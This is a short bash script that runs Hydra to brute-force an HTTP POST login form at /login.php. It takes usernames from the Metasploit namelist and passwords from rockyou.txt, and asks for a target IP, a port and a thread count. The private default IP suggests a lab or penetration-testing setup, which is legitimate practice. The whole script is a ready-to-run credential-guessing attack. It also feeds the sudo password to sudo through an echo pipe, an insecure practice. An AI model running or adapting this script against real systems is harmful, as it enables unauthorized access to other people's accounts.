#!/bin/bash

# -L
nameList='/usr/share/wordlists/metasploit/namelist.txt';

# -P
wordList='/usr/share/wordlists/rockyou.txt';

# sudo password
read -p "Enter sudo password: " -r -s sudo_passwd;
# Target IP
read -p "Enter target IP [192.168.2.65]: " target;
# if [[ $target =~ ^[+-]?[0-9]+$ ]];
# then
#     echo "${target} is an INT";
# elif [[ $target =~ ^[+-]?[0-9]+\.$ ]];
# then
#     echo "Input is a STRING";
# elif [[ $target =~ ^[+-]?[0-9]+\.?[0-9]*$ ]];
# then
#     echo "${target} is a Float";
# else
#     echo "${target} is a STRING";
# fi

# Port
read -p "Enter ${target}:PORT [8080/8081/8082]: " port;

# -t 
read -p "Enter thread [4-16]: " thread;

# # Report path
# user=$(whoami);
# reportPath="/home/${user}/Desktop/hydra.txt";

echo ${sudo_passwd} | sudo hydra -L ${nameList} -P ${wordList} ${target} -s ${port} http-post-form "/login.php:username=^USER^&password=^PASS^:login failed" -t ${thread} -vV;

